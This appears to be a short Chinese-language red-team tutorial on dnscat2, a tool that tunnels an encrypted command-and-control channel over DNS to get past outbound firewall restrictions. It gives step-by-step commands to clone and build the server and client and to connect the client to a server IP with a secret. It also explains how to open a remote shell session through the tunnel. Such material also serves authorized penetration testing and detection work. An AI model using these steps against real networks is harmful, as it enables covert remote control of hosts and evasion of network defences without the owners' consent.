# Dnscat2

内网出口一般对出站流量做了严格限制，但是通常不会限制 DNS 请求，也就是 UDP 53 请求。dnscat2是一款利用 DNS 协议创建加密 C2 隧道来控制服务器的工具。dnscat2 由客户端和服务端两部分组成。

#### 初始化dnscat2服务端

```
Server部署
git clone https://github.com/iagox86/dnscat2.git
apt-get install ruby-dev 
cd dnscat2/server/ 
gem install bundler 
bundle install 
ruby ./dnscat2.rb  # 启动服务端

```

![1.png](images/73b21ef20fe64d258b41413c339f0c3e.png)

#### 编译客户端

```
Client部署
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client/
make (如果你在 windows 环境下编译，需要将client/win32/dnscat2.vcproj 加载到 Visual Studio 并点击 “build” )

```

![2.png](images/d26556c78dbd49f68e599b7bd0ba508e.png)

如果目标内网放行了所有的 DNS 请求，那么就可以直接指定 HOST ，通过 UDP53 端口通信，而如果目标内网只允许和受信任的 DNS 服务器通信时就需要申请注意域名，并将运行 dnscat2 server 的服务器指定 Authoritative DNS 服务器。

注意：Dnscat2 默认是加密的，服务端可以通过–security=open关闭加密，可以提高传输的稳定性。

刚刚在启动服务端的时候默认是加密的，需要记下secret待客户端使用

![3.png](images/1c1594a2cf5249c68ff2bf42de8cdafd.png)

Client运行以下命令发现session建立成功

```
./dnscat --dns server=192.168.137.129,port=53 --secret=ca7670fc9b8f016b3ccb5749d11eed62

```

![4.png](images/f860b8a855e644d691b7ce899750ebdd.png)

#### dnscat2指令

返回服务端查看会话，可以通过help查看支持的命令

![5.png](images/13b37197970f49f48b71e9986c2e499f.png)

你可以通过sessions或windows查看当前会话，用`session(window) -i 1`进入名为1的会话，用help查看支持的命令

![6.png](images/117ce792d26b48ce92c54da19cf59559.png)

如果想返回shell，直接在session 1输入shell创建新的会话，通过ctrl+z返回上一层，选择新的session即可

![7.png](images/cd33aaf6f4064d80af8706f6452d12f3.png)

![8.png](images/aa2d0a23d83c4f29a55b077d47a8b222.png)

